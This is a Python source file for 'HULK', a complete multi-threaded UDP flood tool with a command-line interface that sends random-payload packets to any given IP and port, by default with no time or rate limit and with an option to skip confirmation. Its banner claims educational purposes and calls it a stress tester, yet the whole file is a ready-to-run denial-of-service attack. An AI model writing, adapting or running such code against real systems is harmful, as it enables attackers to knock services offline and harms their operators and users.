import socket
import random
import threading
import ipaddress
import time
import argparse
import platform
import logging
import os
import sys
import signal
from dataclasses import dataclass, field
from typing import Optional
from concurrent.futures import ThreadPoolExecutor
from contextlib import contextmanager

# ─── Logging Configuration ───────────────────────────────────────────────────

LOG_FILE = "hulk.log"
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(threadName)s - %(message)s",
)
logger = logging.getLogger(__name__)

# Also log to console at WARNING+ level
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.WARNING)
console_handler.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
logger.addHandler(console_handler)


# ─── Constants ────────────────────────────────────────────────────────────────

PACKET_SIZE = 1490
MIN_PORT = 1
MAX_PORT = 65535
DEFAULT_PORT = 80
DEFAULT_THREADS = 10
MAX_THREADS = 500
STATS_INTERVAL = 2.0  # seconds between stats updates


# ─── Banner ───────────────────────────────────────────────────────────────────

BANNER = """
    ┌──────────────────────────────────────────────┐
    │            _  _ _   _ _    _  __             │
    │           | || | | | | |  | |/ /             │
    │           | __ | |_| | |__| ' <              │
    │           |_||_|\\___/|____|_|\\_\\             │
    │                                              │
    │          HTTP Unbearable Load King           │
    │          Author: Sumalya Chatterjee          │
    │                                              │
    ├──────────────────────────────────────────────┤
    │  [!] Disclaimer: Educational purposes ONLY   │
    │  [!] Unauthorized use is ILLEGAL             │
    └──────────────────────────────────────────────┘
"""


# ─── Utilities ────────────────────────────────────────────────────────────────

def clear_screen() -> None:
    """Clear the terminal screen in a cross-platform manner."""
    os.system("cls" if platform.system() == "Windows" else "clear")


def validate_ip(ip: str) -> bool:
    """Validate an IP address string."""
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False


def validate_port(port: int) -> bool:
    """Validate a port number is within the valid range."""
    return MIN_PORT <= port <= MAX_PORT


def format_bytes(byte_count: int) -> str:
    """Convert byte count to a human-readable string."""
    for unit in ("B", "KB", "MB", "GB", "TB"):
        if byte_count < 1024:
            return f"{byte_count:.2f} {unit}"
        byte_count /= 1024
    return f"{byte_count:.2f} PB"


def format_duration(seconds: float) -> str:
    """Convert seconds to a human-readable duration string."""
    hours, remainder = divmod(int(seconds), 3600)
    minutes, secs = divmod(remainder, 60)
    if hours > 0:
        return f"{hours}h {minutes}m {secs}s"
    elif minutes > 0:
        return f"{minutes}m {secs}s"
    return f"{secs}s"


@contextmanager
def udp_socket(timeout: float = 5.0):
    """Context manager for UDP sockets with proper cleanup."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    try:
        yield sock
    finally:
        sock.close()


# ─── Attack Statistics ────────────────────────────────────────────────────────

@dataclass
class AttackStats:
    """Thread-safe container for attack statistics."""
    packets_sent: int = 0
    bytes_sent: int = 0
    errors: int = 0
    start_time: float = field(default_factory=time.time)
    _lock: threading.Lock = field(default_factory=threading.Lock, repr=False)

    def record_packet(self, packet_size: int) -> None:
        with self._lock:
            self.packets_sent += 1
            self.bytes_sent += packet_size

    def record_error(self) -> None:
        with self._lock:
            self.errors += 1

    @property
    def elapsed(self) -> float:
        return time.time() - self.start_time

    @property
    def packets_per_second(self) -> float:
        elapsed = self.elapsed
        return self.packets_sent / elapsed if elapsed > 0 else 0.0

    @property
    def bytes_per_second(self) -> float:
        elapsed = self.elapsed
        return self.bytes_sent / elapsed if elapsed > 0 else 0.0

    def summary(self) -> str:
        return (
            f"  📊 Packets Sent : {self.packets_sent:,}\n"
            f"  📦 Data Sent    : {format_bytes(self.bytes_sent)}\n"
            f"  ⚡ Rate         : {self.packets_per_second:,.1f} pkt/s "
            f"({format_bytes(self.bytes_per_second)}/s)\n"
            f"  ❌ Errors       : {self.errors:,}\n"
            f"  ⏱  Duration     : {format_duration(self.elapsed)}"
        )


# ─── Target Validation ───────────────────────────────────────────────────────

@dataclass(frozen=True)
class Target:
    """Immutable representation of an attack target."""
    ip: str
    port: int

    def __post_init__(self):
        if not validate_ip(self.ip):
            raise ValueError(f"Invalid IP address: {self.ip}")
        if not validate_port(self.port):
            raise ValueError(f"Port must be between {MIN_PORT} and {MAX_PORT}, got: {self.port}")

    def __str__(self) -> str:
        return f"{self.ip}:{self.port}"

    def is_reachable(self, timeout: float = 3.0) -> bool:
        """Check if the target port is reachable via UDP (best-effort)."""
        try:
            with udp_socket(timeout) as sock:
                sock.sendto(b"\x00", (self.ip, self.port))
            return True
        except socket.error:
            return False


# ─── Attack Configuration ────────────────────────────────────────────────────

@dataclass(frozen=True)
class AttackConfig:
    """Immutable configuration for an attack."""
    target: Target
    threads: int = DEFAULT_THREADS
    duration: Optional[float] = None
    rate_limit: Optional[float] = None  # packets per second per thread
    packet_size: int = PACKET_SIZE
    confirm: bool = True

    def __post_init__(self):
        if self.threads < 1 or self.threads > MAX_THREADS:
            raise ValueError(f"Thread count must be between 1 and {MAX_THREADS}")
        if self.duration is not None and self.duration <= 0:
            raise ValueError("Duration must be a positive number")
        if self.rate_limit is not None and self.rate_limit <= 0:
            raise ValueError("Rate limit must be a positive number")
        if self.packet_size < 1 or self.packet_size > 65507:
            raise ValueError("Packet size must be between 1 and 65507")


# ─── HULK Attack Engine ──────────────────────────────────────────────────────

class HulkAttack:
    """
    UDP flood attack engine with multi-threading, rate limiting,
    duration control, and live statistics reporting.
    """

    def __init__(self, config: AttackConfig):
        self.config = config
        self.stats = AttackStats()
        self._stop_event = threading.Event()
        self._payload = random._urandom(config.packet_size)

    # ── Public API ────────────────────────────────────────────────────────

    def start(self) -> None:
        """Run the attack with the configured parameters."""
        clear_screen()
        print(BANNER)
        self._print_config()

        if self.config.confirm and not self._confirm_attack():
            print("\n  [!] Attack cancelled by user.")
            return

        # Pre-flight reachability check
        print(f"\n  [~] Checking target reachability ({self.config.target})...")
        if not self.config.target.is_reachable():
            logger.warning("Target may not be reachable (UDP is connectionless — proceeding anyway)")
            print("  [⚠] Target may not be reachable — proceeding anyway (UDP is connectionless).\n")
        else:
            print("  [✔] Target appears reachable.\n")

        logger.info(
            "Attack started | target=%s threads=%d duration=%s rate_limit=%s",
            self.config.target,
            self.config.threads,
            self.config.duration or "unlimited",
            self.config.rate_limit or "unlimited",
        )

        self.stats = AttackStats()  # reset stats
        self._stop_event.clear()

        # Register signal handlers for graceful shutdown
        original_sigint = signal.getsignal(signal.SIGINT)
        signal.signal(signal.SIGINT, self._signal_handler)

        try:
            self._run_attack()
        finally:
            signal.signal(signal.SIGINT, original_sigint)
            self._print_summary()

    def stop(self) -> None:
        """Signal all threads to stop."""
        self._stop_event.set()

    # ── Private Methods ───────────────────────────────────────────────────

    def _signal_handler(self, signum, frame):
        """Handle Ctrl+C gracefully."""
        print("\n\n  [!] Ctrl+C detected — stopping attack...")
        self.stop()

    def _confirm_attack(self) -> bool:
        """Ask the user to confirm before starting."""
        try:
            response = input("  [?] Start the attack? (y/N): ").strip().lower()
            return response in ("y", "yes")
        except (EOFError, KeyboardInterrupt):
            return False

    def _print_config(self) -> None:
        """Print the current attack configuration."""
        cfg = self.config
        print(f"  ┌─ Attack Configuration ──────────────────────┐")
        print(f"  │  Target     : {cfg.target}".ljust(49) + "│")
        print(f"  │  Threads    : {cfg.threads}".ljust(49) + "│")
        dur_str = f"{cfg.duration}s" if cfg.duration else "Unlimited"
        print(f"  │  Duration   : {dur_str}".ljust(49) + "│")
        rate_str = f"{cfg.rate_limit} pkt/s/thread" if cfg.rate_limit else "Unlimited"
        print(f"  │  Rate Limit : {rate_str}".ljust(49) + "│")
        print(f"  │  Packet Size: {cfg.packet_size} bytes".ljust(49) + "│")
        print(f"  └─────────────────────────────────────────────┘")

    def _print_summary(self) -> None:
        """Print final attack summary."""
        print(f"\n  ┌─ Attack Summary ─────────────────────────────┐")
        for line in self.stats.summary().split("\n"):
            print(f"  │ {line}".ljust(50) + "│")
        print(f"  └──────────────────────────────────────────────┘\n")
        logger.info(
            "Attack completed | packets=%d bytes=%d errors=%d duration=%.1fs",
            self.stats.packets_sent,
            self.stats.bytes_sent,
            self.stats.errors,
            self.stats.elapsed,
        )

    def _should_stop(self) -> bool:
        """Check whether the attack should stop."""
        if self._stop_event.is_set():
            return True
        if self.config.duration and self.stats.elapsed >= self.config.duration:
            return True
        return False

    def _send_packets(self) -> None:
        """Worker function: send UDP packets in a loop."""
        target = self.config.target
        delay = (1.0 / self.config.rate_limit) if self.config.rate_limit else 0

        with udp_socket() as sock:
            while not self._should_stop():
                try:
                    sock.sendto(self._payload, (target.ip, target.port))
                    self.stats.record_packet(len(self._payload))
                except socket.error as e:
                    self.stats.record_error()
                    logger.error("Socket error in %s: %s", threading.current_thread().name, e)
                    # Back off briefly on errors to avoid tight error loops
                    time.sleep(0.5)
                    continue

                if delay > 0:
                    time.sleep(delay)

    def _stats_reporter(self) -> None:
        """Periodically print live stats to the console."""
        while not self._should_stop():
            time.sleep(STATS_INTERVAL)
            if self._stop_event.is_set():
                break
            stats = self.stats
            elapsed_str = format_duration(stats.elapsed)
            pps = stats.packets_per_second
            bps = format_bytes(stats.bytes_per_second)
            print(
                f"\r  [▶] {stats.packets_sent:>10,} pkts | "
                f"{format_bytes(stats.bytes_sent):>10} sent | "
                f"{pps:>8,.1f} pkt/s | "
                f"{bps}/s | "
                f"⏱ {elapsed_str} | "
                f"❌ {stats.errors}",
                end="",
                flush=True,
            )

    def _run_attack(self) -> None:
        """Orchestrate the attack threads and stats reporter."""
        print(f"  [▶] Launching {self.config.threads} attack threads...\n")

        with ThreadPoolExecutor(
            max_workers=self.config.threads + 1,
            thread_name_prefix="hulk-worker",
        ) as executor:
            # Submit the stats reporter
            stats_future = executor.submit(self._stats_reporter)

            # Submit attack workers
            futures = [
                executor.submit(self._send_packets)
                for _ in range(self.config.threads)
            ]

            # Wait for all workers to finish (they stop on _stop_event or duration)
            for future in futures:
                future.result()

            # Stop the stats reporter
            self._stop_event.set()
            stats_future.result()

        print()  # newline after the carriage-return stats line


# ─── CLI Entry Point ─────────────────────────────────────────────────────────

def parse_arguments() -> argparse.Namespace:
    """Parse and validate command-line arguments."""
    parser = argparse.ArgumentParser(
        description="HULK — HTTP Unbearable Load King (Educational UDP Stress Tester)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python hulk.py --ip 192.168.1.100 --port 80 --threads 20 --duration 60\n"
            "  python hulk.py --ip 10.0.0.5 --port 53 --rate 1000 --duration 30\n"
            "  python hulk.py --ip 192.168.1.100 --port 80 --no-confirm\n"
        ),
    )
    parser.add_argument("--ip", required=True, help="Target IP address")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help=f"Target port (default: {DEFAULT_PORT})")
    parser.add_argument(
        "--threads", type=int, default=DEFAULT_THREADS,
        help=f"Number of concurrent threads (default: {DEFAULT_THREADS}, max: {MAX_THREADS})",
    )
    parser.add_argument("--duration", type=float, help="Attack duration in seconds (default: unlimited)")
    parser.add_argument("--rate", type=float, help="Rate limit in packets/second per thread (default: unlimited)")
    parser.add_argument(
        "--packet-size", type=int, default=PACKET_SIZE,
        help=f"Payload size in bytes (default: {PACKET_SIZE})",
    )
    parser.add_argument(
        "--no-confirm", action="store_true",
        help="Skip the confirmation prompt before starting",
    )
    return parser.parse_args()


def main() -> None:
    args = parse_arguments()

    try:
        target = Target(ip=args.ip, port=args.port)
    except ValueError as e:
        print(f"\n  ✘ {e}")
        sys.exit(1)

    try:
        config = AttackConfig(
            target=target,
            threads=args.threads,
            duration=args.duration,
            rate_limit=args.rate,
            packet_size=args.packet_size,
            confirm=not args.no_confirm,
        )
    except ValueError as e:
        print(f"\n  ✘ Configuration error: {e}")
        sys.exit(1)

    attack = HulkAttack(config)
    attack.start()


if __name__ == "__main__":
    main()